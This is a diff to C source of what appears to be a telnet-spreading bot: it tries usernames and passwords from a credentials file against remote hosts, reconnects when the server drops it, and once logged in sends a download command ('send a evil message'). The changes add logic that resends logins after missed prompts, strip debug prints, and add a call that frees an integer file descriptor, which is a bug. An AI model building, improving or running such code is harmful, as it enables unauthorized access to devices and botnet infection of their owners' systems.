@@ -1,4 +1,6 @@
 #include "../header/header.h"
+#define RED   "\x1B[31m"
+#define RESET "\x1B[0m"
 
 FILE *credentials_file = NULL;
 // handle file read
@@ -163,6 +165,7 @@ int telnet_connect(telnet_info *info) {
 
 	if (connect(fd, (struct sockaddr *) addr, sizeof(struct sockaddr_in)) == -1) {
 		perror("connect telnet connect");
+		free(fd);
 		return EXIT_FAILURE;
 	}
 	free(addr);
@@ -182,6 +185,10 @@ int telnet_login(telnet_info *info) {
 
 	bool logged = false;
 	bool wait_pass = false;
+
+	// counter to help handle telnet replay packets that repeat content
+	int replay_ctr = 0;
+	bool resend_login = false;
 
 	terminal_set(info->fd_telnet);
 
@@ -215,25 +222,19 @@ int telnet_login(telnet_info *info) {
 		// we need to set this every time before call select, because linux modify them
 		FD_SET(info->fd_telnet, &write_set);
 		FD_SET(info->fd_telnet, &read_set);
-printf("antes do select\n");
+
 		if (select(nfds, &read_set, &write_set, NULL, &ts) == -1) {
 			perror("select telnet");
 			return EXIT_FAILURE;
 		}
-printf("depois do select\n");
 		if (FD_ISSET(info->fd_telnet, &read_set)) {
-printf("leitura\n");
 			int num_read = read(info->fd_telnet, buf, MAX_BUF - 1);
 			buf[num_read] = '\0';
 
-			if (!strcmp(buf, "\r\n") || !strcmp(buf, "\n")) {
-				printf("buf com CR e LF\n");
-			} else {
+			// don't consider empty string as last_read, to avoid losing messages due CR and LF
+			if (buf[0] != '\n' && buf[0] != '\r') {
 				strncpy(last_read, buf, num_read);
 			}
-			printf("valor do buf = %s\n", buf);
-			//write(STDOUT_FILENO, buf, num_read);
-			//fflush(stdout);
 
 			// check if we've a prompt
 			if (strstr(buf, "#") || strstr(buf, "~") || strstr(buf, "$")) {
@@ -250,11 +251,21 @@ printf("leitura\n");
 		}
 
 		if (FD_ISSET(info->fd_telnet, &write_set)) {
-printf("escrita\nvalor last read = %s\n", last_read);
+
 			// empty read must continue to select, this can happens when channel comunication
 			// become available for writing but telnet server doesn't sent nothing yet
-			if (!last_read) continue;
+			if (!*last_read) {
+				// some sleep to give the server chance to send something
+				sleep(1);
 
+				// we employ a replay counter to help us to identify when we missed something and server is waiting for some data, if replay counter is 3, we may send something
+				if (replay_ctr++ >= 3)
+					resend_login = true;
+				else
+					continue;
+			} else {
+				replay_ctr = 0;
+			}
 			// do we have a shell? if yes send a evil message :-)
 			if (logged) {
 				send_download_command(info->fd_telnet);
@@ -262,15 +273,17 @@ printf("escrita\nvalor last read = %s\n", last_read);
 				return EXIT_SUCCESS;
 
 			// sometimes message can come in strange order, we must be sure that wait_pass is not set ye
-			} else if (strcasestr(last_read, "login") && !wait_pass) {
+			} else if (resend_login || (strcasestr(last_read, "login") && !wait_pass)) {
+				resend_login = false;
+				#ifdef DEBUG
+				printf("%susing username and pass %s %s%s\n", RED, user, pass, RESET);
+				#endif
 				// trying username
-				if (send(info->fd_telnet, user, strlen(user), MSG_NOSIGNAL) == -1) {
+				if ((send(info->fd_telnet, user, strlen(user), MSG_NOSIGNAL) == -1) || send(info->fd_telnet, "\n", 1, MSG_NOSIGNAL) == -1) {
 					// EPIPE generate after too much wrong user/pass. we can try workaround this connecting again
 					if (errno == EPIPE) {
 						// if we can't connect again we must resign and try another host
 						if (telnet_connect(info) == EXIT_SUCCESS) {
-							printf("conectou\n");
-							//send(info->fd_telnet, user, strlen(user), 0);
 							wait_pass = false;
 							continue;
 						} else {
@@ -279,14 +292,20 @@ printf("escrita\nvalor last read = %s\n", last_read);
 					}
 				}
 
-				write(info->fd_telnet, "\n", 1);
 				wait_pass = true;
-				#ifdef DEBUG
-				printf("trying user %s and pass %s\n", user, pass);
-				#endif
 			}
 			if (strcasestr(last_read, "password")) {
-				write(info->fd_telnet, pass, strlen(pass));
+				if (send(info->fd_telnet, pass, strlen(pass), MSG_NOSIGNAL) == -1) {
+					if (errno == EPIPE) {
+						// if we can't connect again we must resign and try another host
+						if (telnet_connect(info) == EXIT_SUCCESS) {
+							wait_pass = false;
+							continue;
+						} else {
+							return EXIT_FAILURE;
+						}
+					}
+				}
 			}
 
 			sleep(1);
